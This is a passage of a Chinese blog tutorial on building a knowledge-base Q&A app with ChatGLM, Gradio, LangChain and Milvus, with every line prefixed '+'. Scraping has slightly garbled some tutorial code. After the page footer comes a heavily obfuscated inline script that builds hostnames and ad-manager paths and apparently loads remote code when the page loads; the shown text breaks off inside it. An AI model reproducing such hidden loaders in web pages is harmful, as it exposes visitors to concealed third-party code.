+<p>上面使用了提示模板的方式，将我们查询出来的文档作为提示内容交给模型进行推理回答。到此，我们就简单实现了一个基于知识库的问答应用。</p> 
+<p>如果你想在web上像<code>chatgpt</code>一样提问，也可以丰富一下上面的代码</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> transformers <span class="token keyword">import</span> AutoModel<span class="token punctuation">,</span> AutoTokenizer
+<span class="token keyword">import</span> gradio <span class="token keyword">as</span> gr
+<span class="token keyword">import</span> mdtex2html
+
+<span class="token keyword">from</span> knowledge_query <span class="token keyword">import</span> search_similar_text
+
+tokenizer <span class="token operator">=</span> AutoTokenizer<span class="token punctuation">.</span>from_pretrained<span class="token punctuation">(</span><span class="token string">"THUDM/chatglm-6b-int4"</span><span class="token punctuation">,</span> trust_remote_code<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+model <span class="token operator">=</span> AutoModel<span class="token punctuation">.</span>from_pretrained<span class="token punctuation">(</span><span class="token string">"THUDM/chatglm-6b-int4"</span><span class="token punctuation">,</span> trust_remote_code<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>half<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cuda<span class="token punctuation">(</span><span class="token punctuation">)</span>
+model <span class="token operator">=</span> model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+is_knowledge <span class="token operator">=</span> <span class="token boolean">True</span>
+
+<span class="token triple-quoted-string string">"""Override Chatbot.postprocess"""</span>
+
+
+<span class="token keyword">def</span> <span class="token function">postprocess</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> y <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> <span class="token punctuation">(</span>message<span class="token punctuation">,</span> response<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>
+            <span class="token boolean">None</span> <span class="token keyword">if</span> message <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> mdtex2html<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token boolean">None</span> <span class="token keyword">if</span> response <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> mdtex2html<span class="token punctuation">.</span>convert<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> y
+
+
+gr<span class="token punctuation">.</span>Chatbot<span class="token punctuation">.</span>postprocess <span class="token operator">=</span> postprocess
+
+
+<span class="token keyword">def</span> <span class="token function">parse_text</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""copy from https://github.com/GaiZhenbiao/ChuanhuChatGPT/"""</span>
+    lines <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span>
+    lines <span class="token operator">=</span> <span class="token punctuation">[</span>line <span class="token keyword">for</span> line <span class="token keyword">in</span> lines <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">]</span>
+    count <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token string">"```"</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
+            count <span class="token operator">+=</span> <span class="token number">1</span>
+            items <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'`'</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+                lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'&lt;pre&gt;&lt;code class="language-</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>items<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"&gt;'</span></span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;'</span></span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
+                <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"`"</span><span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"&amp;nbsp;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"&amp;ast;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lowbar;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"&#045;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"&#046;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"&#033;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">"&#040;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">,</span> <span class="token string">"&#041;"</span><span class="token punctuation">)</span>
+                    line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"&#036;"</span><span class="token punctuation">)</span>
+                lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"&lt;br&gt;"</span><span class="token operator">+</span>line
+    text <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>lines<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> text
+
+
+<span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">,</span> chatbot<span class="token punctuation">,</span> max_length<span class="token punctuation">,</span> top_p<span class="token punctuation">,</span> temperature<span class="token punctuation">,</span> history<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> is_knowledge
+
+    chatbot<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>parse_text<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    query <span class="token operator">=</span> <span class="token builtin">input</span>
+    <span class="token keyword">if</span> is_knowledge<span class="token punctuation">:</span>
+        res <span class="token operator">=</span> search_similar_text<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>
+        prompt_template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""基于以下已知信息，简洁和专业的来回答用户的问题。
+如果无法从中得到答案，请说 "当前会话仅支持解决一个类型的问题，请清空历史信息重试"，不允许在答案中添加编造成分，答案请使用中文。
+
+已知内容:
+</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>res<span class="token punctuation">}</span></span><span class="token string">
+
+问题:
+</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token builtin">input</span><span class="token punctuation">}</span></span><span class="token string">
+"""</span></span>
+        query <span class="token operator">=</span> prompt_template
+        is_knowledge <span class="token operator">=</span> <span class="token boolean">False</span>
+    <span class="token keyword">for</span> response<span class="token punctuation">,</span> history <span class="token keyword">in</span> model<span class="token punctuation">.</span>stream_chat<span class="token punctuation">(</span>tokenizer<span class="token punctuation">,</span> query<span class="token punctuation">,</span> history<span class="token punctuation">,</span> max_length<span class="token operator">=</span>max_length<span class="token punctuation">,</span> top_p<span class="token operator">=</span>top_p<span class="token punctuation">,</span>
+                                               temperature<span class="token operator">=</span>temperature<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        chatbot<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>parse_text<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">,</span> parse_text<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">yield</span> chatbot<span class="token punctuation">,</span> history
+
+
+<span class="token keyword">def</span> <span class="token function">reset_user_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> gr<span class="token punctuation">.</span>update<span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">reset_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> is_knowledge
+
+    is_knowledge <span class="token operator">=</span> <span class="token boolean">False</span>
+    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+
+<span class="token keyword">with</span> gr<span class="token punctuation">.</span>Blocks<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> demo<span class="token punctuation">:</span>
+    gr<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""&lt;h1 align="center"&gt;ChatGLM&lt;/h1&gt;"""</span><span class="token punctuation">)</span>
+
+    chatbot <span class="token operator">=</span> gr<span class="token punctuation">.</span>Chatbot<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> gr<span class="token punctuation">.</span>Row<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">with</span> gr<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>scale<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">with</span> gr<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>scale<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                user_input <span class="token operator">=</span> gr<span class="token punctuation">.</span>Textbox<span class="token punctuation">(</span>show_label<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> placeholder<span class="token operator">=</span><span class="token string">"Input..."</span><span class="token punctuation">,</span> lines<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">(</span>
+                    container<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+            <span class="token keyword">with</span> gr<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>min_width<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span> scale<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                submitBtn <span class="token operator">=</span> gr<span class="token punctuation">.</span>Button<span class="token punctuation">(</span><span class="token string">"Submit"</span><span class="token punctuation">,</span> variant<span class="token operator">=</span><span class="token string">"primary"</span><span class="token punctuation">)</span>
+        <span class="token keyword">with</span> gr<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>scale<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            emptyBtn <span class="token operator">=</span> gr<span class="token punctuation">.</span>Button<span class="token punctuation">(</span><span class="token string">"Clear History"</span><span class="token punctuation">)</span>
+            max_length <span class="token operator">=</span> gr<span class="token punctuation">.</span>Slider<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4096</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">,</span> step<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"Maximum length"</span><span class="token punctuation">,</span> interactive<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+            top_p <span class="token operator">=</span> gr<span class="token punctuation">.</span>Slider<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> step<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"Top P"</span><span class="token punctuation">,</span> interactive<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+            temperature <span class="token operator">=</span> gr<span class="token punctuation">.</span>Slider<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token number">0.95</span><span class="token punctuation">,</span> step<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"Temperature"</span><span class="token punctuation">,</span> interactive<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+    history <span class="token operator">=</span> gr<span class="token punctuation">.</span>State<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+    submitBtn<span class="token punctuation">.</span>click<span class="token punctuation">(</span>predict<span class="token punctuation">,</span> <span class="token punctuation">[</span>user_input<span class="token punctuation">,</span> chatbot<span class="token punctuation">,</span> max_length<span class="token punctuation">,</span> top_p<span class="token punctuation">,</span> temperature<span class="token punctuation">,</span> history<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>chatbot<span class="token punctuation">,</span> history<span class="token punctuation">]</span><span class="token punctuation">,</span>
+                    show_progress<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    submitBtn<span class="token punctuation">.</span>click<span class="token punctuation">(</span>reset_user_input<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>user_input<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+    emptyBtn<span class="token punctuation">.</span>click<span class="token punctuation">(</span>reset_state<span class="token punctuation">,</span> outputs<span class="token operator">=</span><span class="token punctuation">[</span>chatbot<span class="token punctuation">,</span> history<span class="token punctuation">]</span><span class="token punctuation">,</span> show_progress<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+demo<span class="token punctuation">.</span>queue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>launch<span class="token punctuation">(</span>share<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> inbrowser<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+</code></pre> 
+<p>把<code>ChatGLM</code>中的web_demo代码简单改写，我们就得到了一个一模一样的前端应用，不同的是它现在可以基于我们的知识库来回答问题。</p> 
+<h1>
+<a id="_399"></a>小结</h1> 
+<p>上述内容仅仅介绍了最简单的通过向量索引库加AI模型加提示工程来实现知识库问答的方案，其中向量索引和文档的处理非常原始与粗糙，想要实现更加精准的匹配还需要根据实际文档内容和场景来进行修改。</p> 
+<p>相关代码已上传github <a href="https://github.com/Mickls/knowledge_with_chatglm">knowledge_with_chatglm</a>感兴趣的同学可以 clone 下来跑一跑</p> 
+<h1>
+<a id="langchain_404"></a>使用langchain改进代码</h1> 
+<p>langchain最为目前非常火的开源库，用于知识库问答也能极大的增加开发效率并且降低工作量。例如上述的文档预处理和用户提问匹配知识库两个步骤，我们用了很多代码编写来实现这个功能。但是当我们使用langchain之后就变得简单起来，下面给出代码示例：</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> langchain<span class="token punctuation">.</span>vectorstores <span class="token keyword">import</span> Milvus
+<span class="token keyword">from</span> langchain<span class="token punctuation">.</span>document_loaders <span class="token keyword">import</span> DirectoryLoader<span class="token punctuation">,</span> TextLoader
+<span class="token keyword">from</span> langchain<span class="token punctuation">.</span>text_splitter <span class="token keyword">import</span> CharacterTextSplitter
+<span class="token keyword">from</span> langchain<span class="token punctuation">.</span>embeddings <span class="token keyword">import</span> HuggingFaceEmbeddings
+
+<span class="token comment"># 加载文件夹中的所有txt类型的文件</span>
+loader <span class="token operator">=</span> DirectoryLoader<span class="token punctuation">(</span><span class="token string">'./knowledge/'</span><span class="token punctuation">,</span> glob<span class="token operator">=</span><span class="token string">'**/*.txt'</span><span class="token punctuation">,</span> show_progress<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> loader_cls<span class="token operator">=</span>TextLoader<span class="token punctuation">,</span>
+                         loader_kwargs<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"encoding"</span><span class="token punctuation">:</span> <span class="token string">"utf-8"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+documents <span class="token operator">=</span> loader<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 初始化加载器</span>
+text_splitter <span class="token operator">=</span> CharacterTextSplitter<span class="token punctuation">(</span>chunk_size<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> chunk_overlap<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token comment"># 切割加载的 document</span>
+split_docs <span class="token operator">=</span> text_splitter<span class="token punctuation">.</span>split_documents<span class="token punctuation">(</span>documents<span class="token punctuation">)</span>
+
+embeddings <span class="token operator">=</span> HuggingFaceEmbeddings<span class="token punctuation">(</span>model_name<span class="token operator">=</span><span class="token string">"shibing624/text2vec-base-chinese"</span><span class="token punctuation">)</span>
+vector_db <span class="token operator">=</span> Milvus<span class="token punctuation">.</span>from_documents<span class="token punctuation">(</span>split_docs<span class="token punctuation">,</span> embeddings<span class="token punctuation">,</span> connection_args<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"host"</span><span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string">"port"</span><span class="token punctuation">:</span> <span class="token string">"19530"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                                  collection_name<span class="token operator">=</span><span class="token string">"langchain_knowledge"</span><span class="token punctuation">,</span> drop_old<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+</code></pre> 
+<p>通过上述代码可以看到，langchain为我们封装好了非常多的工具。例如<code>DirectoryLoader</code>和<code>TextLoader</code>可以直接让我们加载文档，配合<code>CharacterTextSplitter</code>可以将加载的文档分割成设定好的一片一片的集合。与此同时使用langchain提供的向量数据库工具，可以轻松将文档向量化并持久化储存。这样仅仅六行代码我们就完成了之前几十行代码才能完成的工作，且不必考虑如何创建字段，维护数据库等。</p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50